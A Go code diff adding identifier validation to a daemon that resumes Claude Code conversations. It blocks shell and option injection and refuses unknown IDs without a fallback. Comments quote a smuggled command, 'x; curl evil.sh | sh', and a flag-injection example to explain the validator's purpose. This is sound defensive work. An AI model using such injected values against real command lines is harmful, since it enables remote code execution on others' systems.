@@ -2,6 +2,7 @@ package session
 
 import (
 	"cmp"
+	"errors"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -27,6 +28,12 @@ const (
 	// thing it names.
 	conversationSuffix = ".jsonl"
 
+	// maxConversationID bounds an identifier this daemon will carry. A UUID is
+	// 36 characters, so the bound is loose on purpose: the store's naming is
+	// Claude Code's to change, and a ceiling this far above it refuses only
+	// something that is not an identifier at all.
+	maxConversationID = 64
+
 	// maxListedConversations bounds one listing, for the same reason
 	// config.DiscoveredWorkDirs is bounded: this is offered at the create form,
 	// so a directory a daemon has been driving for months must not turn one
@@ -38,6 +45,24 @@ const (
 	// (FR-037).
 	maxListedConversations = 200
 )
+
+// ErrUnknownConversation refuses a create naming a conversation this daemon
+// cannot resume in the working directory that create asked for (FR-032).
+//
+// One sentinel for every way the name can fail — an identifier outside the
+// alphabet below, one belonging to a different directory, one that never
+// existed, and one in a store this host does not have. They are one refusal for
+// the reason the working-directory refusals are one: a caller who could tell
+// them apart could ask this daemon which conversations exist where, and the
+// listing is deliberately not an oracle.
+//
+// **It is never resolved to the most recent conversation instead.** "The last
+// conversation in this directory" is exactly the reading FR-032 forbids: a
+// directory two sessions share has a most-recent conversation belonging to
+// whichever of them wrote last, so a fallback would resume a stranger's work
+// into this operator's pane. A refusal they can retry is strictly better than a
+// success they cannot undo.
+var ErrUnknownConversation = errors.New("no such prior conversation in that working directory")
 
 // Conversation is a prior conversation offered for resume: an identifier and a
 // time, and deliberately nothing else (FR-034, data-model §4).
@@ -136,7 +161,7 @@ func listConversations(workDir string, roots []config.ApprovedRoot, store string
 			continue
 		}
 		id := strings.TrimSuffix(entry.Name(), conversationSuffix)
-		if id == entry.Name() || id == "" {
+		if id == entry.Name() || !resumableID(id) {
 			continue
 		}
 		// Info stats the entry the listing already named. A failure here is a
@@ -180,4 +205,100 @@ func listConversations(workDir string, roots []config.ApprovedRoot, store string
 // directory.
 func storeDirName(workDir string) string {
 	return strings.ReplaceAll(workDir, pathSeparator, "-")
+}
+
+// resumableID reports whether an identifier is one this daemon will both offer
+// and accept.
+//
+// It is one predicate at both ends for the reason config.IsSecret is one (T001):
+// the list a create form renders and the check a create runs must not disagree
+// about what an identifier is, or the page offers something the daemon refuses
+// and the operator has no way to tell which of the two is wrong.
+//
+// The alphabet is the security half, and it is here rather than at the create
+// route because of where a resumed identifier ends up. Everything else this file
+// produces is escaped into markup; this one string is *typed into the session's
+// shell* beside the start command (see Manager.start), so it is the only value
+// the store contributes to a command line. A store entry named
+// `x; curl evil.sh | sh.jsonl` is a file anyone who can write a directory under
+// the daemon's home can create, and letters, digits, "-" and "_" are what makes
+// it impossible for such a name to be anything but a word the shell cannot act
+// on. Underscore is admitted because the naming is Claude Code's rather than
+// this daemon's, and it is as inert as the hyphen already is.
+//
+// An entry the alphabet turns away is simply not a conversation as far as this
+// daemon is concerned: it is not listed, so it cannot be offered, and it is not
+// accepted, so it cannot be asked for. That is the direction this must fail in —
+// the alternative to a missing suggestion is a command line the operator did not
+// write.
+func resumableID(id string) bool {
+	if id == "" || len(id) > maxConversationID {
+		return false
+	}
+	// A leading "-" is the hole the alphabet alone leaves open, and it needs no
+	// metacharacter at all: `--resume --dangerously-skip-permissions` is a command
+	// line where the identifier was read as the *next option* rather than as the
+	// value of this one, so a store entry named after a flag would turn a resume
+	// into a flag the operator did not configure. A conversation Claude Code named
+	// starts with a hex digit; anything that does not start with a letter or a
+	// digit is not one.
+	switch first := id[0]; {
+	case first >= 'a' && first <= 'z', first >= 'A' && first <= 'Z', first >= '0' && first <= '9':
+	default:
+		return false
+	}
+	for i := 0; i < len(id); i++ {
+		c := id[i]
+		switch {
+		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9':
+		case c == '-', c == '_':
+		default:
+			return false
+		}
+	}
+	return true
+}
+
+// resumableConversation answers which conversation a create may resume, and it
+// is the whole of FR-032 (T032).
+//
+// Empty is fresh, and fresh is the default: a create that says nothing about a
+// conversation starts one, so a resume is always something the operator chose
+// (FR-037). Nothing here infers a conversation from a working directory.
+//
+// Anything else must name **exactly one** of the conversations the given working
+// directory already holds. The identifier is checked against that directory's own
+// listing rather than trusted, which is what makes the offer on the create form a
+// convenience and not an authorisation — the same relationship the working
+// directory's <datalist> has to ResolveWorkDir (FR-042). An operator who typed an
+// identifier they were never offered is treated identically to one who picked
+// from the list, and both meet this lookup.
+//
+// A name that matches nothing is refused rather than resolved to the newest
+// entry. See ErrUnknownConversation for why that fallback is the defect and not
+// the convenience it looks like.
+//
+// The identifier is never in the error. It is caller text, and every reason on
+// the audit trail is a sentinel this codebase authored (docs/security.md).
+func resumableConversation(id, workDir string, roots []config.ApprovedRoot, store string) (string, error) {
+	if id == "" {
+		return "", nil
+	}
+	// Ahead of the listing, so an identifier that could never be resumed costs no
+	// directory read at all — and so the one string that reaches a command line is
+	// checked even if a later edit ever loosens what the listing returns.
+	if !resumableID(id) {
+		return "", fmt.Errorf("resume a prior conversation: %w", ErrUnknownConversation)
+	}
+
+	found, err := listConversations(workDir, roots, store)
+	if err != nil {
+		return "", fmt.Errorf("resume a prior conversation: %w", err)
+	}
+	for _, c := range found {
+		if c.ID == id {
+			return id, nil
+		}
+	}
+	return "", fmt.Errorf("resume a prior conversation: %w", ErrUnknownConversation)
 }
